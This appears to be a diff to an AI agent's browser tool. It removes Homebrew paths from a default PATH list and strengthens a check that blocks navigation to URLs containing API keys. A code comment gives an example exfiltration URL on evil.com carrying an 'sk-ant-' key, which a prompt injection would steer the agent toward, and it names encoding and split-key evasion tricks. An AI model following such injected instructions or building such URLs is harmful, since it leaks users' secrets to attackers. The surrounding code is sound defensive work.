@@ -100,13 +100,14 @@ except ImportError:
 logger = logging.getLogger(__name__)
 
 # Standard PATH entries for environments with minimal PATH (e.g. systemd services).
-# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
-# npx, node, and Android's glibc runner (grun).
+# Includes Android/Termux locations needed for agent-browser, npx, node, and
+# Android's glibc runner (grun).
+# NOTE: Homebrew directories (/opt/homebrew/*) are intentionally excluded from
+# _SANE_PATH for security reasons - they're added dynamically via
+# _discover_homebrew_node_dirs() when explicitly needed.
 _SANE_PATH_DIRS = (
     "/data/data/com.termux/files/usr/bin",
     "/data/data/com.termux/files/usr/sbin",
-    "/opt/homebrew/bin",
-    "/opt/homebrew/sbin",
     "/usr/local/sbin",
     "/usr/local/bin",
     "/usr/sbin",
@@ -2159,11 +2160,10 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
+    # Check multiple URL-decoded variants and split query values to catch
+    # encoding tricks (e.g. sk%252Dant%252D...) and split-key attacks.
+    from agent.redact import url_contains_secret
+    if url_contains_secret(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL contains what appears to be an API key or token. "
